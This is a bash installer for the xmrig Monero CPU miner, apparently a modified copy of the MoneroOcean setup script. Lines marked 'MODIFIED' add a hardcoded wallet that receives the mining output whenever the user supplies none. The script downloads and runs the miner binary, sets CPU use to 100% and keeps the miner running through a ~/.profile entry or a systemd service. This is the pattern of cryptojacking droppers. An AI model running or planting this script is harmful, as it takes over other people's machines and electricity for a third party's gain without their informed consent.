#!/bin/bash

VERSION=2.12

# printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not advised to run this script under root"
fi

# --- MODIFIED: Default wallet (hardcoded) ---
DEFAULT_WALLET="4223BS9gSB6Zj1aUVKXEzKEgFL15SWunjALZEnAn2wFaNXv4QDpHbEjcMivUq69984gydxwoKeEM2ayNbXXpM7NTDT8wDdX"

# --- MODIFIED: Support both methods ---
if [ ! -z "$1" ]; then
  WALLET="$1"
  EMAIL="$2"
  echo "Using wallet from argument: $WALLET"
else
  WALLET="$DEFAULT_WALLET"
  EMAIL="$1"
  echo "Using default hardcoded wallet: $WALLET"
fi

if [ ! -z "$EMAIL" ]; then
  echo "Email: $EMAIL"
fi
echo ""

# --- DISTRO DETECTION ---
detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
        VERSION=$VERSION_ID
    else
        OS=$(uname -s)
        VERSION=$(uname -r)
    fi
    echo "Detected OS: $OS $VERSION"
}

# --- PACKAGE MANAGER DETECTION ---
detect_package_manager() {
    if command -v apt-get &> /dev/null; then
        PKG_MANAGER="apt-get"
        INSTALL_CMD="sudo apt-get install -y"
        UPDATE_CMD="sudo apt-get update"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"
        PKG_tar="tar"
        PKG_gzip="gzip"
    elif command -v yum &> /dev/null; then
        PKG_MANAGER="yum"
        INSTALL_CMD="sudo yum install -y"
        UPDATE_CMD="sudo yum update -y"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"
        PKG_tar="tar"
        PKG_gzip="gzip"
    elif command -v dnf &> /dev/null; then
        PKG_MANAGER="dnf"
        INSTALL_CMD="sudo dnf install -y"
        UPDATE_CMD="sudo dnf update -y"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"
        PKG_tar="tar"
        PKG_gzip="gzip"
    elif command -v pacman &> /dev/null; then
        PKG_MANAGER="pacman"
        INSTALL_CMD="sudo pacman -S --noconfirm"
        UPDATE_CMD="sudo pacman -Sy"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"
        PKG_tar="tar"
        PKG_gzip="gzip"
    elif command -v zypper &> /dev/null; then
        PKG_MANAGER="zypper"
        INSTALL_CMD="sudo zypper install -y"
        UPDATE_CMD="sudo zypper refresh"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"
        PKG_tar="tar"
        PKG_gzip="gzip"
    elif command -v apk &> /dev/null; then
        PKG_MANAGER="apk"
        INSTALL_CMD="sudo apk add"
        UPDATE_CMD="sudo apk update"
        PKG_curl="curl"
        PKG_wget="wget"
        PKG_bc="bc"
        PKG_systemd="systemd"  # May not be available on Alpine
        PKG_tar="tar"
        PKG_gzip="gzip"
    else
        echo "ERROR: Unsupported package manager. Please install curl, wget, bc, tar, gzip manually."
        exit 1
    fi
}

# --- INSTALL PACKAGE FUNCTION ---
install_package() {
    local pkg=$1
    if ! command -v $pkg &> /dev/null; then
        echo "Installing $pkg..."
        $INSTALL_CMD $pkg
        if [ $? -ne 0 ]; then
            echo "WARNING: Failed to install $pkg. Please install it manually."
        fi
    fi
}

# --- MAIN SCRIPT ---
detect_os
detect_package_manager

# Install required packages
echo "[*] Checking and installing required packages..."
$UPDATE_CMD 2>/dev/null || true  # Ignore errors if update fails

# Install each package individually
for pkg in $PKG_curl $PKG_wget $PKG_bc $PKG_tar $PKG_gzip; do
    install_package $pkg
done

# Special check for nproc (should be available on all systems)
if ! command -v nproc &> /dev/null; then
    echo "WARNING: nproc not found. Using fallback method to count CPU threads."
    CPU_THREADS=$(grep -c ^processor /proc/cpuinfo)
else
    CPU_THREADS=$(nproc)
fi

# checking prerequisites
WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 ] && [ ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  echo "Wallet provided: $WALLET"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! command -v curl &> /dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! command -v lscpu &> /dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! command -v bc &> /dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else 
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=$(power2 $PORT)
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# printing intentions
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/moneroocean/miner.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

# Check sudo availability
if command -v sudo &> /dev/null && sudo -n true 2>/dev/null; then
  SUDO_AVAILABLE=true
  echo "Mining in background will be performed using moneroocean systemd service."
else
  SUDO_AVAILABLE=false
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner
echo "[*] Removing previous moneroocean miner (if any)"
if [ "$SUDO_AVAILABLE" = true ]; then
  sudo systemctl stop moneroocean 2>/dev/null
  sudo systemctl disable moneroocean 2>/dev/null
fi
killall -9 xmrig 2>/dev/null

echo "[*] Removing $HOME/moneroocean directory"
rm -rf $HOME/moneroocean

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/moneroocean/config.json
$HOME/moneroocean/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/moneroocean/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/moneroocean/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest 2>/dev/null | grep -o '".*"' | sed 's/"//g')
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE 2>/dev/null | grep xenial-x64.tar.gz\" | cut -d \" -f2)

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/moneroocean/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/moneroocean/config.json
  $HOME/moneroocean/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/moneroocean/xmrig ]; then
      echo "ERROR: Stock version of $HOME/moneroocean/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/moneroocean/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/moneroocean/xmrig is OK"

PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
if [ "$PASS" == "localhost" ]; then
  PASS=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi

sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/moneroocean/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/moneroocean/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/moneroocean/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/moneroocean/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/moneroocean/xmrig.log'",#' $HOME/moneroocean/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/moneroocean/config.json

cp $HOME/moneroocean/config.json $HOME/moneroocean/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/moneroocean/config_background.json

# preparing script
echo "[*] Creating $HOME/moneroocean/miner.sh script"
cat >$HOME/moneroocean/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/moneroocean/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/moneroocean/miner.sh

# preparing script background work and work under reboot
if [ "$SUDO_AVAILABLE" = false ]; then
  if ! grep moneroocean/miner.sh $HOME/.profile >/dev/null 2>&1; then
    echo "[*] Adding $HOME/moneroocean/miner.sh script to $HOME/.profile"
    echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
  /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
else
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc))) 2>/dev/null || true
  fi

  if ! command -v systemctl &> /dev/null; then
    echo "[*] Running miner in the background (see logs in $HOME/moneroocean/xmrig.log file)"
    /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
    echo "WARNING: systemd not found. Miner started in background but won't auto-start on reboot."
    echo "Please add $HOME/moneroocean/miner.sh to your crontab or rc.local for auto-start."
  else
    echo "[*] Creating moneroocean systemd service"
    cat >/tmp/moneroocean.service <<EOL
[Unit]
Description=Monero Ocean CPU Miner
After=network.target

[Service]
Type=simple
User=$USER
WorkingDirectory=$HOME/moneroocean
ExecStart=$HOME/moneroocean/xmrig --config=$HOME/moneroocean/config.json
Restart=always
RestartSec=10
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/moneroocean.service /etc/systemd/system/moneroocean.service
    echo "[*] Starting moneroocean systemd service"
    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable moneroocean
    sudo systemctl start moneroocean
    echo "To see miner service logs run \"sudo journalctl -u moneroocean -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similar commands under root to limit miner to 95% percent CPU usage:"
  echo "$UPDATE_CMD; $INSTALL_CMD cpulimit"
  echo "sudo cpulimit -e xmrig -l $((95*$CPU_THREADS)) -b"
  if [ -f /etc/rc.local ]; then
    if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
      echo "sudo sed -i -e '\$acpulimit -e xmrig -l $((95*$CPU_THREADS)) -b\\n' /etc/rc.local"
    else
      echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l $((95*$CPU_THREADS)) -b\\n' /etc/rc.local"
    fi
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 95% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 95,/' \$HOME/moneroocean/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 95,/' \$HOME/moneroocean/config_background.json"
fi
echo ""

echo "[*] Setup complete"
echo ""
echo "========================================"
echo "Wallet: $WALLET"
echo "Worker: $PASS"
echo "Service: moneroocean"
echo "========================================"
echo ""
echo "To check status: sudo systemctl status moneroocean"
echo "To view logs: sudo journalctl -u moneroocean -f"
echo ""
echo "If systemd is not available, miner is running in background."
echo "To stop: killall xmrig"
echo "To start: $HOME/moneroocean/miner.sh"